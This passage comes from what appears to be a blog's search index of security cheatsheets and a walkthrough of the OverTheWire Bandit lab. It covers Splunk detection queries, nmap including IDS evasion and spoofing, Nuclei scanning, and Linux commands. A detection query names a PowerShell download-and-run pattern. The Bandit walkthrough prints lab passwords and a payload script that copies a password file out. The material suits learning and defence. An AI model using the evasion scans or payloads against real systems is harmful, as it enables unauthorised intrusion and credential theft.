starting a command\" AND NOT user=\"NETWORK SERVICE\" ANDNOT user=\"LocalSystem\"🖥️ Privilege Escalation Attempts on Windows Systemssourcetype=\"WinEventLog:Security\" EventCode=4672| eval user_account=mvindex(Account_Name,1)| search \"Security ID\" NOT IN (\"SYSTEM\",\"LOCAL SERVICE\",\"NETWORK SERVICE\")⚙️ Automation &amp; Movement🐧 Privilege Escalation Attempts on Linux Systemssourcetype=linux_secure \"sudo:\" |where user!=\"root\" AND user!=\"\"🔐 Privilege Escalation Attempts\"sourcetype=access_* action=privilege_escalation  | stats count by user  | where count &gt; 5\"⚔️ DDoS Attacks\"sourcetype=network_traffic  | stats count by src_ip  | where count &gt; 1000\"⚙️ PowerShell Empire Activity\"sourcetype=WinEventLog:Windows PowerShell  | search (powershell.exe -nop -w hidden -ep bypass -c)|(iex(new-object  net.webclient).downloadstring)\"🛠️ Brute Force Attacks on a Specific Protocolsourcetype=network_traffic protocol=http| stats count by src_ip| where count &gt;= 50🌍 DNS Tunneling Activitysourcetype=dns| stats count by query| where count &gt; 5 AND NOT match(query, \"\\\\.\")🐧 Privilege Escalation Attempts on Linux Systems\"sourcetype=access_* action=\"sudo command\"  | stats count by user  | where count &gt;= 10\"⚙️ Privilege Escalation Attempts Using PowerShellsourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=400| search \"PowerShell pipeline execution details\" AND NOT \"UserPrincipalName=SYSTEM@*\"AND NOT \"UserPrincipalName=NETWORK SERVICE@*\"✉️ Phishing Attempts Through Email Attachmentssourcetype=email| search attachment=\"*.exe\" OR attachment=\"*.zip\"📁 Brute Force Attacks on Web Applicationssourcetype=access_* method=POST uri_path=\"*.php\"| stats count by src_ip| where count &gt;= 50⚒️ Command Injection Attempts on Web Serverssourcetype=access_* method=POST uri_path=\"*.php\"| rex field=_raw \"(?&lt;command&gt;cat|ls|dir)\\s+(?&lt;argument&gt;[^;]+)\"| where isnotnull(command) AND isnotnull(argument)📂 Unauthorized Changes to Critical Files\"sourcetype=access_* action=file_write  | search file_path=\"*/etc/*\" OR file_path=\"*/var/*\"\"🦠 Malware Infectionssourcetype=access_* action=file_download |rex field=file_path \".*\\.(?&lt;extension&gt;[^\\.]+)\"| search extension=\"exe\" OR extension=\"dll\"📡 Command and Control (C2) Traffic\"sourcetype=network_traffic  | stats count by dest_ip  | where count &gt; 500 AND NOT dest_ip IN (192.168.0.0/16, 10.0.0.0/8)\"🛡️ Ransomware Activitysourcetype=access_* action=file_delete| rex field=file_path \".*\\\\.(?&lt;extension&gt;[^\\\\.]+)\"| search extension=\"encrypted\" OR extension=\"locked\" OR extension=\"ransom\"✉️ Phishing Attempts Through Email Attachmentssourcetype=email| search attachment=\"*.exe\" OR attachment=\"*.zip\""
  },
  
  {
    "title": "ports",
    "url": "/posts/ports/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-30 00:00:00 +0530",
    





    
    "snippet": "Network Ports CheatsheetThis cheatsheet covers common network ports used in day-to-day operations as a system engineer.🌐 Web Services            Service      Port Number      Protocol      Descript...",
    "content": "Network Ports CheatsheetThis cheatsheet covers common network ports used in day-to-day operations as a system engineer.🌐 Web Services            Service      Port Number      Protocol      Description                  HTTP      80      TCP      Standard port for HTTP traffic.              HTTPS      443      TCP      Secure HTTP traffic (encrypted with SSL/TLS).      🗂️ File Transfer            Service      Port Number      Protocol      Description                  FTP      21      TCP      File Transfer Protocol (control port).              FTPS      990      TCP      FTP Secure (FTP over SSL/TLS).              SFTP      22      TCP      Secure File Transfer Protocol (SSH).      🔒 Remote Administration            Service      Port Number      Protocol      Description                  SSH      22      TCP      Secure Shell for remote administration.              Telnet      23      TCP      Remote terminal connection (not secure).              RDP      3389      TCP      Remote Desktop Protocol (remote desktop access).      📧 Email Services            Service      Port Number      Protocol      Description                  SMTP      25      TCP      Simple Mail Transfer Protocol (email sending).              IMAP      143      TCP      Internet Message Access Protocol (email retrieval).              POP3      110      TCP      Post Office Protocol 3 (email retrieval).      📡 DNS &amp; Directory Services            Service      Port Number      Protocol      Description                  DNS      53      UDP/TCP      Domain Name System (resolves domain names).              LDAP      389      TCP/UDP      Lightweight Directory Access Protocol.              LDAPS      636      TCP      Secure LDAP over SSL.      🛠️ Network Management            Service      Port Number      Protocol      Description                  SNMP      161      UDP      Simple Network Management Protocol (monitoring).              NTP      123      UDP      Network Time Protocol (time synchronization).      🗄️ Database Services            Service      Port Number      Protocol      Description                  MySQL      3306      TCP      MySQL Database Service.              MongoDB      27017      TCP      MongoDB Database Service.              PostgreSQL      5432      TCP      PostgreSQL Database Service.              Redis      6379      TCP      Redis Database Service.              MongoDB Admin      27018      TCP      MongoDB administrative service.      🖥️ Miscellaneous Services            Service      Port Number      Protocol      Description                  VNC      5900      TCP      Virtual Network Computing (remote access).              SMB      445      TCP      Server Message Block (file sharing).              Git      9418      TCP      Git protocol (used by GitHub, GitLab).              ElasticSearch      9200      TCP      ElasticSearch HTTP port.      🚪 Reserved &amp; Well-Known Ports            Port Range      Description                  0 - 1023      Well-known ports for common services (e.g., HTTP, FTP, SMTP, etc.).              1024 - 49151      Registered ports for other specific services.              49152 - 65535      Dynamic or private ports used for ephemeral connections.      Important Notes:  Always use secure versions of protocols (e.g., SFTP instead of FTP, SSH instead of Telnet).  Change default ports for sensitive services to enhance security.  Ensure firewall rules and access control lists (ACLs) are configured correctly to allow/deny traffic on these ports."
  },
  
  {
    "title": "nuclei",
    "url": "/posts/nuclei/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-30 00:00:00 +0530",
    





    
    "snippet": "Comprehensive Guide to Nuclei ScansNuclei is a powerful tool for performing vulnerability scans and security assessments on web applications. This guide walks you through the different modes, templ...",
    "content": "Comprehensive Guide to Nuclei ScansNuclei is a powerful tool for performing vulnerability scans and security assessments on web applications. This guide walks you through the different modes, templates, and tips for using Nuclei effectively.🌎 Default ModeBy default, Nuclei uses almost all available templates, making it suitable for comprehensive scans. To perform a complete scan, you can use the following commands:&gt; nuclei -u http://domain[.]com&gt; nuclei -l url_list.txt&gt; cat urls.txt | nuclei  Warning: Be cautious when running scans as they can overload servers, especially on high-traffic or resource-constrained systems.🔧 Template-Based ScansNuclei allows you to specify individual templates, folders, tags, or severity levels to target specific vulnerabilities. Below are examples:Using Specific Templates&gt; nuclei -u http://site[.]com -t my-template.yamlScanning a Folder of Templates&gt; nuclei -u http://site[.]com -t nuclei-templates/cves/Using Tags&gt; nuclei -u http://site[.]com -tags log4jBased on Severity&gt; nuclei -u http://site[.]com -severity low⚔️ Moderate ScanNuclei is a powerful tool, but its scans can be resource-intensive. For smaller web applications or systems with limited resources, you can reduce the scan’s impact by controlling its speed and concurrency:&gt; nuclei -u http://site[.]com -rate-limit 20 -concurrency 5 -timeout 10This setup ensures:  Rate Limit: A maximum of 20 requests per second.  Concurrency: Up to 5 concurrent threads.  Timeout: Each request will timeout after 10 seconds if unresponsive.📄 Output OptionsNuclei provides various options for saving the results. Here are some commonly used commands:Save Results to a File&gt; nuclei -u http://domain[.]com -o results.txtSave Results with Responses&gt; nuclei -u http://domain[.]com -o output/results.txt -store-resp outputJSON Output with Request-Response Details&gt; nuclei -u http://site[.]com -o results.txt -json -include-rr🔄 Miscellaneous FeaturesExecute Scans with New Templates Only&gt; nuclei -u http://site[.]com -ntUpdate Nuclei and Templates&gt; nuclei -update&gt; nuclei -update-templatesProxy Requests Through Burp Suite&gt; nuclei -u http://site[.]com -p http://127.0.0.1:8080💣 Scans Based on SeverityYou can target vulnerabilities based on their severity levels. For example, you can scan only for high and medium severity vulnerabilities:&gt; nuclei -u https://domain[.]com -tags xss -severity high,mediumAlternatively, exclude informational vulnerabilities:&gt; nuclei -l target.txt -t /nuclei-templates/cves/2022/ -exclude-severity info📸 Make Screenshots of Your TargetsNuclei supports headless mode to take screenshots of target web pages. Here’s how:Single Target&gt; nuclei -u https://target[.]com -headless -t nuclei-templates/headless/screenshot.yaml -vMultiple Targets&gt; nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v🔬 Template Categories ScansTo scan specific categories of templates, you can define multiple directories. Here’s an example:&gt; nuclei -l disney_httpx.txt -t cves/* -t brute-force/* -t files/* -t panels/* -t tokens/*🌐 Finding Vulnerabilities Using ShodanYou can combine Shodan with Nuclei for an efficient vulnerability scan. Here’s how:Fetch IPs Using Shodan and Scan&gt; shodan search ssl[.]cert[.]subject[.]CN:\"http://target[.]com*\" 200 --fields ip_str | httpx | tee ips.txt&gt; nuclei -l ips.txt -o vulns.txtSimplified Workflowecho 'https://target[.]com' | uncover | httpx | nucleiWith these examples and resources, you can leverage Nuclei to perform powerful and precise scans tailored to your needs. Happy hunting!"
  },
  
  {
    "title": "nmap",
    "url": "/posts/nmap/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-30 00:00:00 +0530",
    





    
    "snippet": "Nmap Cheat SheetTarget Specification            Switch      Example      Description                         nmap 192.168.1.1      Scan a single IP                     nmap 192.168.1.1 192.168.2.1 ...",
    "content": "Nmap Cheat SheetTarget Specification            Switch      Example      Description                         nmap 192.168.1.1      Scan a single IP                     nmap 192.168.1.1 192.168.2.1      Scan specific IPs                     nmap 192.168.1.1-254      Scan a range                     nmap scanme.nmap.org      Scan a domain                     nmap 192.168.1.0/24      Scan using CIDR notation              -iL      nmap -iL targets.txt      Scan targets from a file              -iR      nmap -iR 100      Scan 100 random hosts              –exclude      nmap –exclude 192.168.1.1      Exclude listed hosts      Scan Techniques            Switch      Example      Description                  -sS      nmap 192.168.1.1 -sS      TCP SYN port scan (Default)              -sT      nmap 192.168.1.1 -sT      TCP connect port scan(Default without root privilege)              -sU      nmap 192.168.1.1 -sU      UDP port scan              -sA      nmap 192.168.1.1 -sA      TCP ACK port scan              -sW      nmap 192.168.1.1 -sW      TCP Window port scan              -sM      nmap 192.168.1.1 -sM      TCP Maimon port scan      Host Discovery            Switch      Example      Description                                       -sL      nmap 192.168.1.1-3 -sL      No Scan. List targets only                                   -sn      nmap 192.168.1.1/24 -sn      Disable port scanning. Host discovery only.                                   -Pn      nmap 192.168.1.1-5 -Pn      Disable host discovery. Port scan only.       -PS      nmap 192.168.1.1-5 -PS22-25,80      TCP SYN discovery on port x. Port 80 by default              -PA      nmap 192.168.1.1-5 -PA22-25,80      TCP ACK discovery on port x.                                   Port 80 by default                                                 -PU      nmap 192.168.1.1-5 -PU53      UDP discovery on port x. Port 40125 by default                                   -PR      nmap 192.168.1.1-1/24 -PR      ARP discovery on local network                                   -n      nmap 192.168.1.1 -n      Never do DNS resolution                           Port Specification            Switch      Example      Description                  -p      nmap 192.168.1.1 -p 21      Port scan for port x              -p      nmap 192.168.1.1 -p 21-100      Port range              -p      nmap 192.168.1.1 -p U:53,T:21-25,80      Port scan multiple TCP and UDP ports              -p-      nmap 192.168.1.1 -p-      Port scan all ports              -p      nmap 192.168.1.1 -p http,https      Port scan from service name              -F      nmap 192.168.1.1 -F      Fast port scan (100 ports)              –top-ports      nmap 192.168.1.1 –top-ports 2000      Port scan the top x ports              -p-65535      nmap 192.168.1.1 -p-65535      Leaving off initial port in rangemakes the scan start at port 1              -p0-      nmap 192.168.1.1 -p0-      Leaving off end port in range makes the scan go through to port 65535      Service and Version Detection            Switch      Example      Description                  -sV      nmap 192.168.1.1 -sV      Attempts to determine the version of the service running on port              -sV –version-intensity      nmap 192.168.1.1 -sV –version-intensity 8      Intensity level 0 to 9. Higher number increases possibility of correctness              -sV –version-light      nmap 192.168.1.1 -sV –version-light      Enable light mode. Lower possibility of correctness. Faster              -sV –version-all      nmap 192.168.1.1 -sV –version-all      Enable intensity level 9. Higher possibility of correctness. Slower              -A      nmap 192.168.1.1 -A      Enables OS detection, version detection, script scanning, and traceroute      OS Detection            Switch      Example      Description                  -O      nmap 192.168.1.1 -O      Remote OS detection using TCP/IPstack fingerprinting              -O –osscan-limit      nmap 192.168.1.1 -O –osscan-limit      If at least one open and one closedTCP port are not found it will not tryOS detection against host              -O –osscan-guess      nmap 192.168.1.1 -O –osscan-guess      Makes Nmap guess more aggressively              -O –max-os-tries      nmap 192.168.1.1 -O –max-os-tries 1      Set the maximum number x of OSdetection tries against a target              -A      nmap 192.168.1.1 -A      Enables OS detection, version detection, script scanning, and traceroute      Timing and Performance            Switch      Example      Description                  -T0      nmap 192.168.1.1 -T0      Paranoid (0) Intrusion DetectionSystem evasion              -T1      nmap 192.168.1.1 -T1      Sneaky (1) Intrusion Detection System evasion              -T2      nmap 192.168.1.1 -T2      Polite (2) slows down the scan to use less bandwidth and use less target machine resources              -T3      nmap 192.168.1.1 -T3      Normal (3) which is default speed              -T4      nmap 192.168.1.1 -T4      Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network              -T5      nmap 192.168.1.1 -T5      Insane (5) speeds scan; assumes you are on an extraordinarily fast network                  Switch      Example input      Description                  –host-timeout &lt;time&gt;      1s; 4m; 2h      Give up on target after this long              –min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;      1s; 4m; 2h      Specifies probe round trip time              –min-hostgroup/max-hostgroup &lt;size&lt;size&gt;      50; 1024      Parallel host scan group sizes              –min-parallelism/max-parallelism &lt;numprobes&gt;      10; 1      Probe parallelization              –scan-delay/–max-scan-delay &lt;time&gt;      20ms; 2s; 4m; 5h      Adjust delay between probes              –max-retries &lt;tries&gt;      3      Specify the maximum number of port scan probe retransmissions              –min-rate &lt;number&gt;      100      Send packets no slower than &lt;numberr&gt; per second              –max-rate &lt;number&gt;      100      Send packets no faster than &lt;number&gt; per second      NSE Scripts            Switch      Example      Description                  -sC      nmap 192.168.1.1 -sC      Scan with default NSE scripts. Considered useful for discovery and safe              –script default      nmap 192.168.1.1 –script default      Scan with default NSE scripts. Considered useful for discovery and safe              –script      nmap 192.168.1.1 –script=banner      Scan with a single script. Example banner              –script      nmap 192.168.1.1 –script=http*      Scan with a wildcard. Example http              –script      nmap 192.168.1.1 –script=http,banner      Scan with two scripts. Example http and banner              –script      nmap 192.168.1.1 –script \"not intrusive\"      Scan default, but remove intrusive scripts              –script-args      nmap –script snmp-sysdescr –script-args snmpcommunity=admin 192.168.1.1      NSE script with arguments      Useful NSE Script Examples            Command      Description                  nmap -Pn –script=http-sitemap-generator scanme.nmap.org      http site map generator              nmap -n -Pn -p 80 –open -sV -vvv –script banner,http-title -iR 1000      Fast search for random web servers              nmap -Pn –script=dns-brute domain.com      Brute forces DNS hostnames guessing subdomains              nmap -n -Pn -vv -O -sV –script smb-enum,smb-ls,smb-mbenum,smb-os-discovery,smb-s,smb-vuln,smbv2 -vv 192.168.1.1      Safe SMB scripts to run              nmap –script whois* domain.com      Whois query              nmap -p80 –script http-unsafe-output-escaping scanme.nmap.org      Detect cross site scripting vulnerabilities              nmap -p80 –script http-sql-injection scanme.nmap.org      Check for SQL injections      Firewall / IDS Evasion and Spoofing            Switch      Example      Description                  -f      nmap 192.168.1.1 -f      Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters              –mtu      nmap 192.168.1.1 –mtu 32      Set your own offset size              -D      nmap -D 192.168.1.101,192.168.1.102, 192.168.1.103,192.168.1.23 192.168.1.1                     Send scans from spoofed IPs                            -D      nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip      Above example explained              -S      nmap -S www.microsoft.com www.facebook.com      Scan Facebook from Microsoft (-e eth0 -Pn may be required)              -g      nmap -g 53 192.168.1.1      Use given source port number              –proxies      nmap –proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1      Relay connections through HTTP/SOCKS4 proxies              –data-length      nmap –data-length 200 192.168.1.1      Appends random data to sent packets      Example IDS Evasion commandnmap -f -t 0 -n -Pn –data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1Output            Switch      Example      Description                  -oN      nmap 192.168.1.1 -oN normal.file      Normal output to the file normal.file              -oX      nmap 192.168.1.1 -oX xml.file      XML output to the file xml.file              -oG      nmap 192.168.1.1 -oG grep.file      Grepable output to the file grep.file              -oA      nmap 192.168.1.1 -oA results      Output in the three major formats at once              -oG -      nmap 192.168.1.1 -oG -      Grepable output to screen. -oN -, -oX - also usable              –append-output      nmap 192.168.1.1 -oN file.file –append-output      Append a scan to a previous scan file              -v      nmap 192.168.1.1 -v      Increase the verbosity level (use -vv or more for greater effect)              -d      nmap 192.168.1.1 -d      Increase debugging level (use -dd or more for greater effect)              –reason      nmap 192.168.1.1 –reason      Display the reason a port is in a particular state, same output as -vv              –open      nmap 192.168.1.1 –open      Only show open (or possibly open) ports              –packet-trace      nmap 192.168.1.1 -T4 –packet-trace      Show all packets sent and received              –iflist      nmap –iflist      Shows the host interfaces and routes              –resume      nmap –resume results.file      Resume a scan      Helpful Nmap Output examples            Command      Description                                                     nmap -p80 -sV -oG - –open 192.168.1.1/24      grep open      Scan for web servers and grep to show which IPs are running web servers                                          nmap -iR 10 -n -oX out.xml      grep \"Nmap\"      cut -d \" \" -f5 &gt; live-hosts.txt      Generate a list of the IPs of live hosts                                   nmap -iR 10 -n -oX out2.xml      grep \"Nmap\"      cut -d \" \" -f5 &gt;&gt; live-hosts.txt      Append IP to the list of live hosts                                   ndiff scanl.xml scan2.xml      Compare output from nmap using the ndif                                                 xsltproc nmap.xml -o nmap.html      Convert nmap xml files to html files                                                 grep \" open \" results.nmap      sed -r ‘s/ +/ /g’      sort      uniq -c      sort -rn      less      Reverse sorted list of how often ports turn up      Miscellaneous Options            Switch      Example      Description                  -6      nmap -6 2607:f0d0:1002:51::4      Enable IPv6 scanning              -h      nmap -h      nmap help screen      Other Useful Nmap Commands            Command      Description                  nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn      Discovery only on ports x, no port scan              nmap 192.168.1.1-1/24 -PR -sn -vv      Arp discovery only on local network, no port scan              nmap -iR 10 -sn -traceroute      Traceroute to random targets, no port scan              nmap 192.168.1.1-50 -sL –dns-server 192.168.1.1      Query the Internal DNS for hosts, list targets only      "
  },
  
  {
    "title": "linux",
    "url": "/posts/linux/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-01-28 00:00:00 +0530",
    





    
    "snippet": "🖥️ System Info Shortcuts            Shortcut      Action                  date      Show date and time              uptime      Display system uptime              cal      Show calendar            ...",
    "content": "🖥️ System Info Shortcuts            Shortcut      Action                  date      Show date and time              uptime      Display system uptime              cal      Show calendar              w      Display who is logged in              whoami      Display effective username              finger user      Show info about user              uname -a      Show kernel info              man cmd      Show man page for cmd              df      Display free disk space              du      Display disk usage stats              free      Show memory and swap usage              whereis app      Show where app location is              which app      Show which app      📂 Directory &amp; File Shortcuts            Shortcut      Action                  ls -l      List current dir contents (long format)              ls      List current dir contents              ls -a      List current dir contents including hidden              ls -t      List current dir contents sorted by mod date              cd      Change to home dir              cd dir      Change to directory ‘dir’              pwd      Show current directory              mkdir dir      Make directory ‘dir’              rm -r dir      Remove directory ‘dir’              rm -rf dir      Remove directory ‘dir’ (force)              cp -r dir1 dir2      Copy ‘dir1’ to ‘dir2’              cd -      Change to previous working dir      🗂️ File Management Shortcuts            Shortcut      Action                  rm file      Remove ‘file’              rm -f file      Remove ‘file’ (force)              cp file1 file2      Copy ‘file1’ to ‘file2’              mv file1 file2      Rename or move file1 to file2              ln -s file1 link1      Create symbolic ‘link1’ to ‘file1’              touch file      Create or update ‘file’              cat&gt;file      Put standard output into ‘file’              more file      Output file ‘file’              head file      Output first 10 lines of ‘file’              tail file      Output last 10 lines of ‘file’              tail -f file      Output ‘file’ as it grows      🔍 Search &amp; Locate Shortcuts            Shortcut      Action                  grep pattern files      Search for ‘pattern’ in ‘files’              grep -r pattern dir      Search recursively for ‘pattern’ in dir              cmd | grep pattern      Search for ‘pattern’ in output of cmd              locate file      Find file names quickly      ⌨️ Command Line Control Shortcuts            Shortcut      Action                  ^c      Halt current command              ^z      Background current command              ^d      Delete char in front of cursor or logout              ^u      Erase line              ^r      Search recent commands              ^a      Move to beginning of line              ^e      Move to end of line              ^h      Delete char behind cursor (backspace)              up      Move to previous command              down      Move to next command      ⚙️ Process Management Shortcuts            Shortcut      Action                  ps      Display your active processes              top      Display all processes              kill 5      Terminate process id of 5              kill -9 5      Terminate (KILL) process id of 5              killall proc      Terminate all processes named ‘proc’              bg      List background jobs              fg      Bring most recent job to foreground              fg 2      Bring job 2 to foreground      🕒 Command History Shortcuts            Shortcut      Action                  !!      Repeat last command              sudo !!      Repeat last command as root              up      Move to previous command              down      Move to next command              !3      Execute command 3 in history              history      Show command history      📦 Archive &amp; Compression Shortcuts            Shortcut      Action                  tar cf file.tar files      Create a tar ‘file.tar’ with ‘files’              tar xf file.tar      Extract files from ‘file.tar’              tar czf file.tar.gz files      Create tar with gzip compression              tar xzf file.tar.gz      Extract files from file.tar.gz              gzip file      Compress ‘file’ with gzip              gzip -d file.gz      Decompress ‘file.gz’      "
  },
  
  {
    "title": "Installing Cygwin & the Rsync Package",
    "url": "/posts/cygwin/",
    "categories": "Windows",
    "tags": "",
    "date": "2025-01-28 00:00:00 +0530",
    





    
    "snippet": "How to Install Cygwin on Windows and Add the Rsync PackageIf you’re a Windows user and want to access Linux-like tools and packages, Cygwin is a great solution. Cygwin provides a large collection o...",
    "content": "How to Install Cygwin on Windows and Add the Rsync PackageIf you’re a Windows user and want to access Linux-like tools and packages, Cygwin is a great solution. Cygwin provides a large collection of GNU and Open Source tools, which offer a Linux-like environment on Windows. One such tool is rsync, a powerful utility for file synchronization.In this post, we’ll walk through the installation process of Cygwin on Windows and how to add the rsync package.Step 1: Download the Cygwin InstallerFirst, you’ll need to download the official Cygwin setup package from the Cygwin website.  Navigate to the Cygwin download page and download the setup executable file. It will be named something like setup-x86_64.exe for 64-bit systems.Step 2: Run the Cygwin Setup WizardOnce you have the setup file downloaded, double-click on it to run the Cygwin Setup Wizard.Step 3: Choose Installation Method  When the setup wizard opens, select Install from Internet and click Next.  This option allows Cygwin to download the necessary files from the internet.Step 4: Select Installation Location  Next, you’ll be prompted to select the location where you want to install Cygwin. By default, it installs on your C: drive (C:\\cygwin64), but you can change the location if you’d prefer to install it on a different drive, like your E: drive.  Choose the installation directory and click Next.Step 5: Select Local Package Directory  Now, you’ll need to select a Local Package Directory where the downloaded Cygwin packages will be stored temporarily. For example, you can use your E: drive or any other directory.  After selecting the directory, click Next.Step 6: Choose Internet Connectivity  Select the Direct Connection option for internet connectivity.  If you have a proxy server, you can configure it here, but for most home users, the direct connection will work fine.  Click Next.Step 7: Select Download Mirror  Choose a Download Site. Cygwin will provide a list of mirrors. You can select the mirror closest to your location. I used cygwin.mirror.constant.com for this tutorial.  Click Next.Step 8: Download Cygwin PackagesOnce you’ve selected a mirror, Cygwin will begin downloading the necessary setup files. This process may take a few minutes, depending on your internet connection speed.Step 9: Select Packages to Install  After the download finishes, the setup wizard will ask you to select the packages you want to install.  In this case, we want to install the rsync package. To do this:          In the package list, use the search bar at the top and search for rsync.      Under the “Net” category, locate the rsync package.      Click on the “Skip” label next to rsync to select it for installation (it will change to show the version number).      Step 10: Begin Installation  After selecting rsync and any other packages you wish to install, click Next.  The setup will start installing Cygwin and the selected packages, including rsync.Step 11: Complete the InstallationOnce the installation process is complete, the wizard will prompt you to click Finish.Step 12: Open the Cygwin TerminalAfter the installation is finished, you can access your Linux-like environment by opening the Cygwin Terminal. It should be available from the Start Menu under Cygwin or simply by searching for Cygwin Terminal.To verify that rsync was installed correctly, open the Cygwin terminal and type the following command:rsync -VIf the installation was successful, you should see information about the installed version of rsync.ConclusionNow you have successfully installed Cygwin on your Windows machine and added the rsync package. You can use Cygwin to access a Linux-like environment and use various Linux tools like rsync directly on your Windows machine.With Cygwin, you can take advantage of powerful Unix utilities like rsync, making it easier to manage files and data between your Windows system and other Linux systems."
  },
  
  {
    "title": "OverTheWire Wargames bandit => 3",
    "url": "/posts/bandit-3/",
    "categories": "CTF, community",
    "tags": "",
    "date": "2025-01-26 00:00:00 +0530",
    





    
    "snippet": "OverTheWire is a platform that provides a collection of wargames designed to help individuals enhance their knowledge of cybersecurity. It’s ideal for both beginners and experienced security enthus...",
    "content": "OverTheWire is a platform that provides a collection of wargames designed to help individuals enhance their knowledge of cybersecurity. It’s ideal for both beginners and experienced security enthusiasts looking to expand their skill set in a practical and engaging way.The platform’s wargames are structured to help users progress step-by-step, starting with basic tasks and advancing to more complex challenges. This makes it an excellent tool for learning concepts such as:  Linux/Unix Basics: It introduces beginners to command-line tasks, file manipulation, and system navigation, providing a solid foundation in operating systems.  Networking and Protocols: Challenges related to TCP/IP, HTTP, and other networking protocols teach how to analyze and interact with network traffic, offering insight into penetration testing techniques.  Cryptography: OverTheWire covers fundamental cryptographic concepts, teaching users how to exploit weaknesses in encryption systems and improve their understanding of security protocols.  Web Security: The platform includes practical lessons on common web vulnerabilities such as SQL Injection, Cross-Site Scripting (XSS), and other issues that are crucial for web application security.  Reverse Engineering: Users can dive into reverse engineering challenges to understand how to disassemble and manipulate programs, gaining valuable insight into software vulnerabilities.  Forensics: OverTheWire also helps users build skills in digital forensics by analyzing compromised data, investigating file systems, and extracting hidden information.Bandit, the most popular wargame on OverTheWire, is a great starting point for beginners. It introduces users to basic security concepts and Linux commands, offering a fun, interactive way to start learning. As players progress through the game, they tackle increasingly challenging puzzles that simulate real-world hacking scenarios.In essence, OverTheWire offers a unique, hands-on learning experience where users can practice ethical hacking in a safe, controlled environment. Whether you’re looking to break into the world of cybersecurity or deepen your existing knowledge, OverTheWire provides a wealth of challenges to help you sharpen your skills.This is a continuation from Part 3 of the Bandit Wargame series. If you haven’t checked out Part 2 blog, I highly recommend giving it a read before proceeding, as it covers foundational skills essential for tackling these levels.Now, let’s pick up where we left off and dive deeper into the challenges, starting from Bandit Level 11. These levels will introduce more advanced concepts, helping you sharpen your Linux skills further.Let’s get started!Bandit Level 20 → Level 21Level GoalThere is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).  Note: Try connecting to your own network daemon to see if it works as you thinkbandit20@bandit:~$ cat /etc/bandit_pass/bandit200qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYObandit20@bandit:~$ nc -lvnp 9001Listening on 0.0.0.0 9001Connection received on 127.0.0.1 376520qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYOEeoULMCra2q0dSkYj561DX7s1CpBuOBtBandit Level 21 → Level 22Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.bandit21@bandit:/etc/cron.d$ cat *@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh#!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvtRae0UfB9v0UzbCdn9cY0gQnds9GF58Qbandit21@bandit:/etc/cron.d$ Explanation  The script is a cron job that runs automatically at set intervals.  It performs two actions:          Sets the file permissions of /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv to 644 (readable by everyone but writable only by the owner).      Copies the content of the file /etc/bandit_pass/bandit22 (which contains the password for bandit22) into /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv.      Bandit Level 22 → Level 23Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.  Note: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:~$ echo \"I am user bandit23\" | md5sum | cut -d ' ' -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe813263490Zf11ioIjMVN551jX3CmStKLYqjk54Gabandit22@bandit:~$Bandit Level 23 → Level 24Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.  Note: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!Note: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…bandit23@bandit:$ cat /etc/cron.d/cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullbandit23@bandit:$ cat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$myname/fooecho \"Executing and deleting all scripts in /var/spool/$myname/foo:\"for i in * .*;do    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];    then        echo \"Handling $i\"        owner=\"$(stat --format \"%U\" ./$i)\"        if [ \"${owner}\" = \"bandit23\" ]; then            timeout -s 9 60 ./$i        fi        rm -f ./$i    fidonebandit23@bandit:$bandit23@bandit:/tmp/t00$ cat payload.sh#!/bin/bashcat /etc/bandit_pass/bandit24 &gt; /tmp/t00/passwdbandit23@bandit:/tmp/t00$ touch 